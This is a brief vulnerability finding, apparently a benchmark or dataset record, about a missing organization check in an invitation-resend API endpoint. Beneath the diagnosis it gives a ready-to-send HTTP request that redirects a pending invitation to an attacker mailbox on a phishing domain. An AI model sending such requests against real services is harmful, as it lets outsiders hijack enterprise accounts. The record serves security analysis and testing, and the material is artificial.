diagnosis: ResendInvitationView allows an authenticated user to fetch an Invitation by invitation_id, rewrite its destination email to an attacker-controlled address, and trigger delivery via send_invitation. The view fails to verify whether the caller belongs to the organization that created the invitation, allowing attackers to hijack pending enterprise invitations.
exploit_request:
POST /api/invitations/624/resend/ HTTP/1.1
Host: api.saasworkplace.com
Authorization: Bearer rogue_user_token
Content-Type: application/json

{
  "email": "attacker-mailbox@phishing.net"
}
